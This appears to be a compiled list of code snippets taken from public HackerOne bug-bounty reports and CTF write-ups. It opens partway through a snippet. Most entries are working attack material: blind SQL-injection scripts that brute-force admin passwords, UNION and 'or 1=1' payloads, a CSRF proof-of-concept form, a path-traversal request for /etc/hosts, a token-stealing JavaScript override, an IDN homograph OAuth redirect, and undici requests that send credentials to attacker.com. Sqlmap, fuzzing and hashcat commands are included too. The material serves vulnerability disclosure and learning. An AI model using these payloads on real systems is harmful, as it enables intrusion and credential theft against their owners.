alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        r = requests.get(url + '/score', cookies=cookies)
        if 'There is 1 other' in r.text:
            return password + letter
    return password

password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np
```

## 197. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
```

## 198. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

# How to Install
1. Create a directory that you wish SignUp Manager to be installed into
2. Move signupmanager.zip into the new directory and unzip it
3. For security move users.txt into a directory that cannot be read from website visitors
4. Update index.php with the location of your users.txt file
5. Edit the user and admin php files to display your hidden content
6. You can make anyone an admin by changing the last character in the users.txt file to a Y
7. Default login is admin / password
```

## 199. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```python
def get_data():
  known = ''
  known_max_len = 20

  charset = string.ascii_lowercase + string.digits + '_'
  while True:
    found_next = False
    for char in charset:
      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
      tmp_known = known + temp_char

      params = {
        'username': tmp_known + '%',
        'password': '%'
      }
      query = 'user/?{}'.format(urlencode(params, quote_via=quote))

      res = get_data(query)
      if res['text'] == 'Invalid content type detected':
        known += char
        found_next = True
        print(known)
        break
    if (not found_next):
      print_and_exit('Unable to find the next char')
    elif (len(known) == known_max_len):
      print_and_exit('Found the first {} chars: {}'.format(known_max_len, known))
```

## 200. [#2243710](https://hackerone.com/reports/2243710)  -  Cookie headers are not cleared in cross-domain redirect in undici-fetch
*low, $405*

```python
import { fetch } from 'undici'

const res = await fetch('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
        maxRedirections: 3,
        headers: {
            AutHorization: 'test',
            Cookie: "ddd=dddd"
        }})
const json = await res.json()
console.log(json)
```

## 201. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://bugzilla.mozilla.org/token.cgi" method="POST">
      <input type="hidden" name="cancel&#95;token" value="1727251240&#45;UxKc4U5ThgrHPhWNJ323&#45;fahjy5Pn05h5ZYb7OqG&#45;SI" />
      <input type="hidden" name="t" value="3XOIDGIRtcwC3icniucOlm" />
      <input type="hidden" name="a" value="cxlpw" />
      <input type="hidden" name="cancel" value="Cancel" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 202. [#1595281](https://hackerone.com/reports/1595281)  -  Read beyond bounds in ap_strcmp_match() [zhbug_httpd_47.7]
*low*

```
187: AP_DECLARE(int) ap_strcmp_match(const char *str, const char *expected)
188: {
189:     int x, y;
190:
191:     for (x = 0, y = 0; expected[y]; ++y, ++x) {
192:         if (expected[y] == '*') {
193:             while (expected[++y] == '*');
194:             if (!expected[y])
195:                 return 0;
196:             while (str[x]) {
197:                 int ret;
198:                 if ((ret = ap_strcmp_match(&str[x++], &expected[y])) != 1)
199:                     return ret;
200:             }
201:             return -1;
202:         }
203:         else if (!str[x])
204:             return -1;
205:         else if ((expected[y] != '?') && (str[x] != expected[y]))
206:             return 1;
207:     }
208:     return (str[x] != '\0');
209: }
```

## 203. [#2580062](https://hackerone.com/reports/2580062)  -  NoSQL injection leaks visitor token and livechat messages
*medium*

```
${knownValid}
```

## 204. [#2580062](https://hackerone.com/reports/2580062)  -  NoSQL injection leaks visitor token and livechat messages
*medium*

```
${guesses}
```

## 205. [#1948562](https://hackerone.com/reports/1948562)  -  Information Exposure Through Directory Listing
*high*

```json
[███ █████ █████████████] [core:error] [pid 8186:tid 140028348987136] [client ███:47058] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1
[██████ ████████████ ██████████] [authz_core:error] [pid 8186:tid 140027803723520] [client ██████████:47426] AH01630: client denied by server configuration: proxy:███████████
[████ ████████████ ██████████] [ssl:error] [pid 11243:tid ████] [client ████████:42490] AH02042: rejecting client initiated renegotiation
[█████ ████ ████] [proxy:error] [pid 4547:tid 140029011683072] (111)Connection refused: AH00957: HTTP: attempt to connect to ████:3000 (████████████) failed
```

## 206. [#1668723](https://hackerone.com/reports/1668723)  -  Security token and handler name leak from window.braveBlockRequests
*high*

```
Object.defineProperty(window, "braveBlockRequests", {
    enumerable: false,
    configurable: false,
    writable: false,
    value: function(args) { window.args = args } // Steal handler name and token here
});
```

## 207. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
' or 1=1 -- ` (there must be a space after the t
```

## 208. [#806151](https://hackerone.com/reports/806151)  -  Enumeration of username on password reset page
*low*

```
${input}
```

## 209. [#2212193](https://hackerone.com/reports/2212193)  -  CVE-2023-46218: cookie mixed case PSL bypass
*medium*

```
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

.co.UK	TRUE	/	FALSE	0	super	oops
```

## 210. [#3403450](https://hackerone.com/reports/3403450)  -  Information Disclosure via Verbose Error Messages
*medium*

```
Version: Revive Adserver v6.0.0
PHP/DB: PHP 8.4.13 / MySQL 10.6.22-MariaDB-0ubuntu0.22.04.1
INSERT INTO rv_acls_channel (channelid , logical , type , comparison , data , executionorder ) VALUES ...
INSERT INTO rv_acls_channel (...) VALUES (...)
```

## 211. [#1553301](https://hackerone.com/reports/1553301)  -  CVE-2022-27779: cookie for trailing dot TLD
*medium*

```
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

.me.    TRUE    /       FALSE   0       a       b
```

## 212. [#3750295](https://hackerone.com/reports/3750295)  -  CVE-2026-9079: stale proxy password leak
*medium*

```bash
cd poc
   docker build -t curl-proxyuserpwd-stale-poc .
```

## 213. [#3750295](https://hackerone.com/reports/3750295)  -  CVE-2026-9079: stale proxy password leak
*medium*

```bash
docker run --rm curl-proxyuserpwd-stale-poc
```

## 214. [#397527](https://hackerone.com/reports/397527)  -  Leaking sensitive information on Github lead full access to all Grab Slack channels
*critical*

```json
{
    "installed": {
        "client_id": "█████",
        "project_id": "███████",
        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
        "token_uri": "https://accounts.google.com/o/oauth2/token",
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
        "client_secret": "█████████",
        "redirect_uris": ["urn:ietf:wg:oauth:2.0:oob", "http://localhost"]
    }
}
```

## 215. [#1261413](https://hackerone.com/reports/1261413)  -  HEIC image preview can be used to invoke Imagick
*critical*

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="500"
   height="500">
    <image x="0" y="0" width="500" height="500" xlink:href="/Users/lukasreschke/Downloads/nextcloud20.png" stroke-width="1" id="image3204" />
</svg>
```

## 216. [#308721](https://hackerone.com/reports/308721)  -  [serve] Directory listing and File access even when they have been set to be ignored.
*critical*

```bash
$ node filename.js
```

## 217. [#486933](https://hackerone.com/reports/486933)  -  [serve] Access unlisted internal files/folders revealing sensitive information
*critical*

```bash
$ npm install -g serve
```

## 218. [#486933](https://hackerone.com/reports/486933)  -  [serve] Access unlisted internal files/folders revealing sensitive information
*critical*

```bash
$ git init
$ echo "404 Not Found" > 404.html
$ echo "secret text" > secret
```

## 219. [#486933](https://hackerone.com/reports/486933)  -  [serve] Access unlisted internal files/folders revealing sensitive information
*critical*

```bash
$ serve
INFO: Discovered configuration in `serve.json`
   ┌───────────────────────────────────────────────┐
   │                                               │
   │   Serving!                                    │
   │                                               │
   │   - Local:            http://localhost:5000   │
   │   - On Your Network:  http://127.0.1.1:5000   │
   │                                               │
   │   Copied local address to clipboard!          │
   │                                               │
   └───────────────────────────────────────────────┘
```

## 220. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```bash
$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

## 221. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
It checks two and switch params must be in query and the values must be `two=light&switch=on`
Solution :
```

## 222. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
Open : https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra&template[]=ticket&ticket_id=3582#tab4
Observer the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.
```

## 223. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ echo '{"id":1}' | base64 
eyJpZCI6MX0K
```

## 224. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ wfuzz -zfile,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: https://hackyholidays.h1ctf.com/secure-login
Total requests: 22342

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
===================================================================

000005730:   200        36 L     84 W     1724 Ch     "access"
```

## 225. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
```

## 226. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

## 227. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ ./quiz.py
Password found: 'S3creT_p4ssw0rd-$'
```

## 228. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup as BSHTML

start=''
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

def guess(start):
    for letter in alphabet:
        attempt=start+letter
        url = f'''https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
        r = requests.get(url)
        soup = BSHTML(r.text, "html.parser")
        images = soup.findAll('img')
        r = requests.get("https://hackyholidays.h1ctf.com" + images[1]["src"])
        if len(r.text) != 39:
            return attempt
    return start

updated=guess(start)
while updated != start:
    start = updated
    updated=guess(start)
    print("nearly there: " + updated)

print("found: " + updated)
```

## 229. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ echo '{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}' | base64 -w 0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=
```

## 230. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ echo -n "mrgrinch463127.0.0.1" | md5sum
3e3f8df1658372edf0214e202acb460b  -
```

## 231. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ echo '{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}' | base64 -w0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo=
```

## 232. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api -w raft-small-directories.txt -t 50
```

## 233. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 -w raft-small-words.txt -b 400 -t 50
```

## 234. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ unzip sec-files.zip 
Archive:  sec-files.zip
[sec-files.zip] xxx.png password: 
  inflating: xxx.png
 extracting: flag.txt
```

## 235. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -t 50 -w raft-small-files.txt -b 302
```

## 236. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/forum -w raft-small-directories.txt -t 50
```

## 237. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -p hash --dbms MySQL --dump
```

## 238. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```bash
$ hashcat -O -m 10 -a 0 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt
```

## 239. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```http
POST_HEADERS = {
```

## 240. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```http
get_data()
```

## 241. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```http
get_endpoints()
```

## 242. [#526258](https://hackerone.com/reports/526258)  -  environment variable leakage in error reporting
*low*

```
diff --git a/lib/common.js b/lib/common.js
index ef3e398..e992cd6 100644
--- a/lib/common.js
+++ b/lib/common.js
@@ -339,10 +339,7 @@ exports.makedie = function(instance, ctxt) {
         process.arch +
         ', platform=' +
         process.platform +
-        (!full ? '' : ', path=' + process.execPath) +
-        ', argv=' +
-        Util.inspect(process.argv).replace(/\n/g, '') +
-        (!full ? '' : ', env=' + Util.inspect(process.env).replace(/\n/g, ''))
+        (!full ? '' : ', path=' + process.execPath)

       var when = new Date()
```

## 243. [#490379](https://hackerone.com/reports/490379)  -  [glance] Access unlisted internal files/folders revealing sensitive information
*high*

```bash
$ npm install -g glance
```

## 244. [#490379](https://hackerone.com/reports/490379)  -  [glance] Access unlisted internal files/folders revealing sensitive information
*high*

```bash
$ git init
```

## 245. [#490379](https://hackerone.com/reports/490379)  -  [glance] Access unlisted internal files/folders revealing sensitive information
*high*

```bash
$ glance --verbose
glance serving /project/directory on port 8080
```

## 246. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```python
import requests as req
import string
import re

QUIZ_URL = 'https://hackyholidays.h1ctf.com/evil-quiz'
START_URL = 'https://hackyholidays.h1ctf.com/evil-quiz/start'
POST_HEADERS = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

def send_sqli(query):
  session = req.session()
  session.get(QUIZ_URL) # to generate cookies
  session.post(
    QUIZ_URL,
    headers=POST_HEADERS,
    data={'name': 'jghuyqhfyxjgh123' + query}
  )
  res = session.post(
    START_URL,
    headers=POST_HEADERS,
    data='ques_1=0&ques_2=0&ques_3=0'
  )
  count_match = re.search(r'There is (\d+) other', res.text)
  if count_match:
    return int(count_match.group(1)) > 0
  print('Match not found')
  exit(0)

def get_charset():
  charset = ''
  base_charset = string.digits + string.ascii_letters + string.punctuation + ' '
  for char in base_charset:
    temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char

    query = 'select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1'
    query = '\' or ({}) = 1 -- '.format(query)
    print(query)

    if (send_sqli(query)):
# … truncated …
```

## 247. [#861940](https://hackerone.com/reports/861940)  -  OAuth `redirect_uri` bypass using IDN homograph attack resulting in user's access token leakage
*medium*

```
https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https://oauth.šemrush.com/oauth2/success
```

## 248. [#629892](https://hackerone.com/reports/629892)  -  Lack of CSRF header validation at https://g-mail.grammarly.com/profile
*medium*

```javascript
var xhttp = new XMLHttpRequest();
var data = new FormData();
data.append("email", "████████");
data.append("unsubscribe", "false");
(...)
xhttp.open("POST", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send(data);
```

## 249. [#724944](https://hackerone.com/reports/724944)  -  latest_activity_id and latest_activity_at may disclose information about internal activities to unauthorized users
*low*

```
HTTP/1.1 200 OK
Date: Tue, 29 Oct 2019 17:50:48 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: no-cache, no-store
Content-Disposition: inline; filename="response."
X-Request-Id: eb31d77a-6b54-4bcb-8007-c90f0b19307d
Set-Cookie: ███
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
CF-Cache-Status: DYNAMIC
Server: cloudflare
CF-RAY: 52d6fe6eed5dd5fc-BOM
Content-Length: 82

{"data":{"node":{"_id":"████████","latest_activity_at":"███████"}}}
# … truncated …
```

## 250. [#632808](https://hackerone.com/reports/632808)  -  Information disclosure on sim.starbucks.com
*low*

```
https://sim.starbucks.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```

## 251. [#397031](https://hackerone.com/reports/397031)  -  Disclosure of top 10 vulnerability types for programs that haven't enabled the Insights feature
*low*

```
HTTP/1.1 200 OK
Date: Sun, 19 Aug 2018 12:24:05 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: no-cache, no-store
Content-Disposition: inline; filename="response."
X-Request-Id: 1af97dec-6e22-40c2-8483-16c4ee717d0e
Set-Cookie: ...
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare
CF-RAY: 44cc98517fe13415-HKG
Content-Length: 4736

██████████
# … truncated …
```

## 252. [#2390009](https://hackerone.com/reports/2390009)  -  Proxy-Authorization header is not cleared in cross-domain redirect in undici
*low, $405*

```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```

## 253. [#2243710](https://hackerone.com/reports/2243710)  -  Cookie headers are not cleared in cross-domain redirect in undici-fetch
*low, $405*

```python
import { request } from 'undici'
const {
  statusCode,
  headers,
  trailers,
  body
} = await request('http://anysite.com/redirect.php?url=http://attacker:8182',{
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
	    cookie: "ddd=dddd"
        }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
  console.log('data', data)
}
```
